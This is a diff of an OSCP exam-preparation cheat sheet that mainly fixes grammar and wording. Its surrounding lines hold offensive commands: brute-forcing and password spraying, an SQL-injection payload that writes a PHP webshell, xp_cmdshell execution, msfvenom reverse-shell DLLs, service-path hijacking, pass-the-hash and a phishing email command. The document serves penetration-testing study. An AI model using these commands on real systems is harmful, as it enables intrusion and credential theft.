@@ -2,15 +2,15 @@
 
 **Prepared as part of my OSCP Preparation.**
 
-Successfully passed the OSCP exam on May 20, 2024. Verify my achievement [here](https://www.credential.net/666b9a86-017d-48fa-894a-5c39ef1d7b7b).
-
-You can access my cheatsheet from here https://s4thv1k.com/posts/oscp-cheatsheet/ as well!
+- Successfully passed the OSCP exam on May 20, 2024. Verify my achievement [here](https://www.credential.net/666b9a86-017d-48fa-894a-5c39ef1d7b7b).
+- Feel free to open a pull request if you have any corrections, improvements, or new additions!
+- You can access my cheatsheet from here: https://s4thv1k.com/posts/oscp-cheatsheet/ as well!
 
 # General
 
 
 <aside>
-💡 For Finding all important files in Windows:(CTF Style)
+💡 For Finding all important files in Windows (CTF Style)
 
 `cd c:\Users` then
 `tree /F`
@@ -497,7 +497,7 @@ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip #Cracking zip fil
 
 > [https://github.com/openwall/john/tree/bleeding-jumbo/run](https://github.com/openwall/john/tree/bleeding-jumbo/run)
 > 
-- If there’s an encrypted file, try to convert it into john hash and crack.
+- If there’s an encrypted file, convert it into john hash and crack.
 
 ```powershell
 ssh2john.py id_rsa > hash
@@ -528,11 +528,11 @@ proxychains4 crackmapexec smb 10.10.10.0/24 #Example
 ## Dealing with Passwords
 
 - When there’s a scope for bruteforce or hash-cracking then try the following,
-    - Have a valid usernames first
+    - Have a valid username first
     - Don't forget trying `admin:admin`
     - Try `username:username` as first credential
     - If it’s related to a service, try default passwords.
-    - Service name as the username as well as the same name for password.
+    - The service name is the username, and the same name is used for the password.
     - Use Rockyou.txt
 - Some default passwords to always try out!
 
@@ -671,27 +671,27 @@ sudo ip r add <subnet> dev ligolo
     </aside>
     
     - whois: `whois <domain>` or `whois <domain> -h <IP>`
-    - Google dorking,
+    - Google Dorking,
         - site
         - filetype
         - intitle
         - GHDB - Google hacking database
     - OS and Service Information using [searchdns.netcraft.com](http://searchdns.netcraft.com)
-    - Github dorking
+    - Github Dorking
         - filename
         - user
         - A tool called Gitleaks for automated enumeration
     - Shodan dorks
         - hostname
         - port
-        - Then gather infor by going through the options
+        - Then gather information by going through the options
     - Scanning Security headers and SSL/TLS using [https://securityheaders.com/](https://securityheaders.com/)
     
 
 ## Port Scanning
 
 ```powershell
-#use -Pn option if you're getting nothing in scan
+#use -Pn option if you're getting nothing in the scan
 nmap -sC -sV <IP> -v #Basic scan
 nmap -T4 -A -p- <IP> -v #complete scan
 sudo nmap -sV -p 443 --script "vuln" 192.168.50.124 #running vuln category scripts
@@ -710,7 +710,7 @@ Test-NetConnection -Port <port> <IP>   #powershell utility
 
 ```powershell
 ftp <IP>
-#login if you have relevant creds or based on nmpa scan find out whether this has anonymous login or not, then loginwith Anonymous:password
+#login if you have relevant creds or based on nmap scan find out whether this has an anonymous login or not, then login with Anonymous:password
 
 put <file> #uploading file
 get <file> #downloading file
@@ -720,29 +720,29 @@ locate .nse | grep ftp
 nmap -p21 --script=<name> <IP>
 
 #bruteforce
-hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and viceversa
+hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and vice versa
 
-#check for vulnerabilities associated with the version identified.
+# Check for vulnerabilities associated with the identified version.
 ```
 
 ## SSH enumeration
 
 ```powershell
 #Login
-ssh uname@IP #enter password in the prompt
+ssh uname@IP #enter the password in the prompt
 
 #id_rsa or id_ecdsa file
 chmod 600 id_rsa/id_ecdsa
-ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for password, crack them using John
+ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for the password, crack it using John
 
 #cracking id_rsa or id_ecdsa
 ssh2john id_ecdsa(or)id_rsa > hash
 john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash
 
 #bruteforce
-hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and viceversa
+hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and vice versa
 
-#check for vulnerabilities associated with the version identified.
+# Check for vulnerabilities associated with the identified version.
 ```
 
 ## SMB enumeration
@@ -784,7 +784,7 @@ put <file> #to upload file
 get <file> #to download file
 ```
 
-- Downloading shares made easy - if the folder consists of several files, they all be downloading by this.
+- Downloading shares is made easy—if the folder consists of several files, they will all be downloaded by this.
 
 ```powershell
 mask ""
@@ -795,11 +795,11 @@ mget *
 
 ## HTTP/S enumeration
 
-- View source-code and identify any hidden content. If some image looks suspicious download and try to find hidden data in it.
+- View the source code and identify any hidden content. If an image looks suspicious, download it and try to find hidden data in it.
 - Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
 - check /robots.txt folder
 - Look for the hostname and add the relevant one to `/etc/hosts` file.
-- Directory and file discovery - Obtain any hidden files which may contain juicy information
+- Directory and file discovery - Obtain any hidden files that may contain juicy information
 
 ```powershell
 dirbuster
@@ -808,20 +808,20 @@ python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
 ```
 
 - Vulnerability Scanning using nikto: `nikto -h <url>`
-- `HTTPS`SSL certificate inspection, this may reveal information like subdomains, usernames…etc
-- Default credentials, Identify the CMS or service and check for default credentials and test them out.
+- `HTTPS`SSL certificate inspection, may reveal information like subdomains, usernames…etc
+- Default credentials: Identify the CMS or service, check for default credentials, and test them out.
 - Bruteforce
 
 ```powershell
 hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
-# Use https-post-form mode for https, post or get can be obtained from Burpsuite. Also do capture the response for detailed info.
+# Use https-post-form mode for https, post, or get, which can be obtained from Burpsuite. Also, capture the response for detailed information.
 
 #Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!
 ```
 
-- if `cgi-bin` is present then do further fuzzing and obtain files like .sh or .pl
-- Check if other services like FTP/SMB or anyothers which has upload privileges are getting reflected on web.
-- API - Fuzz further and it can reveal some sensitive information
+- if `cgi-bin` is present, then do further fuzzing and obtain files like .sh or .pl
+- Check if other services like FTP/SMB or any other that has upload privileges are getting reflected on the web.
+- API - Fuzz further, and it can reveal some sensitive information
 
 ```powershell
 #identifying endpoints using gobuster
@@ -841,7 +841,7 @@ curl -i http://192.168.50.16:5002/users/v1
 # basic usage
 wpscan --url "target" --verbose
 
-# enumerate vulnerable plugins, users, vulrenable themes, timthumbs
+# enumerate vulnerable plugins, users, vulnerable themes, timthumbs
 wpscan --url "target" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log
 
 # Add Wpscan API to get the details of vulnerabilties.
@@ -894,9 +894,9 @@ nslookup -type=TXT info.megacorptwo.com 192.168.50.151 #We are querying the info
 
 ```powershell
 nc -nv <IP> 25 #Version Detection
-smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode, it can be RCPT, VRFY, EXPN
+smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode; it can be RCPT, VRFY, EXPN
 
-#Sending emain with valid credentials, the below is an example for Phishing mail attack
+#Sending email with valid credentials, the below is an example of Phishing mail attack
 sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 
@@ -907,7 +907,7 @@ ldapsearch -x -H ldap://<IP>:<port> # try on both ldap and ldaps, this is first 
 
 ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
 ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-#CN name describes the info w're collecting
+#CN name describes the info we're collecting
 ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
 ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
 ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
@@ -1024,7 +1024,7 @@ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
 ## Local File Inclusion
 
-- Main difference between Directory traversal and this attack is, here we’re able to execute commands remotely.
+- The main difference between Directory traversal and this attack is that we can execute commands remotely here.
 
 ```powershell
 #At first we need 
@@ -1095,13 +1095,13 @@ RECONFIGURE;
 #Now we can run commands
 EXECUTE xp_cmdshell 'whoami';
 
-#Sometimes we may not have direct access to convert it to RCE from web, then follow below steps
+#Sometimes we may not have direct access to convert it to RCE from the web, then follow the below steps
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
 #Now we can exploit it
 http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
 ```
 
-- SQLMap - Automated Code execution
+- SQLMap - Automated Code Execution
 
 ```powershell
 sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user #Testing on parameter names "user", we'll get confirmation
@@ -1150,7 +1150,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 ```
 
 <aside>
-💡 While dealing with PHP reverseshell use: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
+💡 While dealing with PHP reverse shell use: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
 
 </aside>
 
@@ -1248,9 +1248,9 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 
 ```powershell
 #Identify service from winpeas
-icalcs "path" #F means full permission, we need to check we have full access on folder
-sc qc <servicename> #find binarypath variable
-sc config <service> <option>="<value>" #change the path to the reverseshell location
+icalcs "path" #F means full permission, we need to check we have full access on the folder
+sc qc <servicename> #find binary path variable
+sc config <service> <option>="<value>" #change the path to the reverse shell location
 sc start <servicename>
 ```
 
@@ -1277,11 +1277,11 @@ sc start <service>
 
 ```bash
 #Look for the following in Winpeas services info output
-HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) #This means we have ful access
+HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) #This means we have full access
 
 accesschk /acceptula -uvwqk <path of registry> #Check for KEY_ALL_ACCESS
 
-#Service Information from regedit, identify the variable which holds the executable
+#Service Information from regedit, identify the variable that holds the executable
 reg query <reg-path>
 
 reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
@@ -1292,14 +1292,14 @@ net start <service>
 
 ## DLL Hijacking
 
-1. Find Missing DLLs using Process Monitor, Identify a specific service which looks suspicious and add a filter.
+1. Find Missing DLLs using Process Monitor, Identify a specific service that looks suspicious, and add a filter.
 2. Check whether you have write permissions in the directory associated with the service.
 ```bash
 # Create a reverse-shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-port> -f dll > filename.dll
 ```
-3. Copy it to victom machine and them move it to the service associated directory.(Make sure the dll name is similar to missing name)
-4. Start listener and restart service, you'll get a shell.
+3. Copy it to the victim machine and then move it to the service-associated directory.(Make sure the dll name is similar to the missing name)
+4. Start the listener and restart the service; you'll get a shell.
 
 ## Autorun
 
@@ -1355,7 +1355,7 @@ file://c:/windows/system32/cmd.exe
 
 ## SAM and SYSTEM
 
-- Check in following folders
+- Check in the following folders
 
 ```bash
 # Usually %SYSTEMROOT% = C:\Windows
@@ -1436,13 +1436,13 @@ reg query "HKCU\Software\TightVNC\Server"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  
 
-### SNMP Paramters  
+### SNMP Parameters  
 reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  
 
 ### Putty  
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  
 
-### Search for password in registry  
+### Search for the password in the registry  
 reg query HKLM /f password /t REG_SZ /s  
 reg query HKCU /f password /t REG_SZ /s
 ```
@@ -1450,7 +1450,7 @@ reg query HKCU /f password /t REG_SZ /s
 ### RunAs - Savedcreds
 
 ```bash
-cmdkey /list #Displays stored credentials, looks for any optential users
+cmdkey /list #Displays stored credentials looks for any optential users
 #Transfer the reverseshell
 runas /savecred /user:admin C:\Temp\reverse.exe
 ```
@@ -1458,7 +1458,7 @@ runas /savecred /user:admin C:\Temp\reverse.exe
 ### Pass the Hash
 
 ```bash
-#If hashes are obtained though some means then use psexec, smbexec and obtain the shell as different user.
+#If hashes are obtained through some means, then use psexec and smbexec and obtain the shell as a different user.
 pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
 ```
 
@@ -1483,7 +1483,7 @@ perl -e 'exec "/bin/sh";'
 
 ```bash
 find / -writable -type d 2>/dev/null
-dpkg -l #Installed applications on debian system
+dpkg -l #Installed applications on Debian system
 cat /etc/fstab #Listing mounted drives
 lsblk #Listing all available drives
 lsmod #Listing loaded drivers
@@ -1509,7 +1509,7 @@ Mestaploit: multi/recon/local_exploit_suggester
 cat .bashrc
 env #checking environment variables
 watch -n 1 "ps -aux | grep pass" #Harvesting active processes for credentials
-#Process related information can also be obtained from PSPY
+# Process-related information can also be obtained from PSPY
 ```
 
 ## Sudo/SUID/Capabilities
@@ -1530,7 +1530,7 @@ getcap -r / 2>/dev/null
 cat /etc/crontab
 crontab -l
 
-pspy #handy tool to livemonitor stuff happening in Linux
+pspy #handy tool to live monitor stuff happening in Linux
 
 grep "CRON" /var/log/syslog #inspecting cron logs
 ```
@@ -1552,11 +1552,11 @@ chmod +x <binary>
 
 # Post Exploitation
 
-> This is more windows specific as exam specific.
+> This is more Windows-specific as exam-specific.
 > 
 
 <aside>
-💡 Run WinPEAS.exe - This may give us some more detailed information as no we’re a privileged user and we can open several files, gives some edge!
+💡 Run WinPEAS.exe - This may give us some more detailed information as no, we’re a privileged user, and we can open several files, which gives us some edge!
 
 </aside>
 
@@ -1586,14 +1586,14 @@ reg query HKCU /f password /t REG_SZ /s
 ```
 
 <aside>
-💡 Always check documents folders, i may contain some juicy files
+💡 Always check document folders, they may contain some juicy files
 
 </aside>
 
 ### KDBX Files
 
 ```powershell
-#These are KeyPassX password stored files
+#These are KeyPassX password-stored files
 cmd> dir /s /b *.kdbx 
 Ps> Get-ChildItem -Recurse -Filter *.kdbx
 
@@ -1605,14 +1605,14 @@ john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
 ## Dumping Hashes
 
 1. Use Mimikatz
-2. If this is a domain joined machine, run BloodHound.
+2. If this is a domain-joined machine, run BloodHound.
 
 ---
 
 # Active Directory Pentesting
 
 <aside>
-💡 We perform the following stuff once we’re in AD network
+💡 We perform the following stuff once we’re in the AD network
 
 </aside>
 
@@ -1625,10 +1625,10 @@ net localgroup Administrators #to check local admins
 ### Powerview
 
 ```powershell
-Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
+Import-Module .\PowerView.ps1 #loading module to powershell, if it gives an error then change the execution policy
 Get-NetDomain #basic information about the domain
 Get-NetUser #list of all users in the domain
-# The above command's outputs can be filtered using "select" command. For example, "Get-NetUser | select cn", here cn is sideheading for   the output of above command. we can select any number of them seperated by comma.
+# The above command's outputs can be filtered using "select" command. For example, "Get-NetUser | select cn", here cn is a sideheading for the output of the above command. we can select any number of them seperated by comma.
 Get-NetGroup # enumerate domain groups
 Get-NetGroup "group name" # information from specific group
 Get-NetComputer # enumerate the computer objects in the domain
@@ -1670,7 +1670,7 @@ sudo neo4j console
 
 ### LDAPDOMAINDUMP
 
-- These files contains information in a well structured webpage format.
+- These files contain information in a well-structured webpage format.
 
 ```bash
 sudo ldapdomaindump ldaps://<IP> -u 'username' -p 'password' #Do this in a new folder
@@ -1691,7 +1691,7 @@ firefox index.html
 
 - [www.pingcastle.com](http://www.pingcastle.com) - Download Zip file from here.
 - This needs to be run on windows machine, just hit enter and give the domain to scan.
-- It gives a report at end of scan.
+- It gives a report at the end of the scan.
 
 ### PsLoggedon
 
@@ -1834,7 +1834,7 @@ secretsdump.py <domain>/<user>:<password>@<IP> -just-dc-ntlm
 
 - Here we can pass the credentials or even hash, depending on what we have
 
-> *Always pass full hash to these tools!*
+> *Always pass the full hash to these tools!*
 > 
 
 ```powershell
@@ -1874,7 +1874,7 @@ winrs -r:<computername> -u:<user> -p:<password> "command"
 crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
 crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Bruteforcing attack, smb can be replaced. Shows "Pwned"
 crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #grepping the way out!
-crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success  #Password spraying, viceversa can also be done
+crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success  #Password spraying, vice versa can also be done
 
 #Try --local-auth option if nothing comes up
 crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares #lists all shares, provide creds if you have one
